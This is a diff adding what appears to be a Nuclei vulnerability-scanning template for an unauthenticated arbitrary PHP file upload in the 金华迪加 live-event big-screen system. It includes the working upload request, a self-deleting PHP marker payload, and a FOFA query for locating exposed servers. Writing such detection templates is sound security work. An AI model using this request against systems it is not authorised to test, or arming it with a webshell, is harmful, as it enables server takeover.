@@ -1,0 +1,41 @@
+http:
+    - extractors:
+        - internal: true
+          json:
+            - .message.picurl
+          name: picurl
+          part: body
+          type: json
+      raw:
+        - |
+          POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+          Content-Type: application/x-www-form-urlencoded
+
+          filetype=php&imgbase64=PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "24642"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{picurl}} HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+id: jinhuadijia-mobile_do_php-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+        金华迪加 现场大屏互动系统 mobile.do.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。
+    name: 金华迪加 现场大屏互动系统 mobile.do.php 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489162&idx=1&sn=4403c403b1e4cd4fbe11ee692ea72a19&chksm=c267a3b9f5102aaf1a7f7a2ade110f5377e77300d005f9b6dddb2fbefefdef9224665abae9fa&token=824558965&lang=zh_CN#rd
+    severity: high
+    tags: []
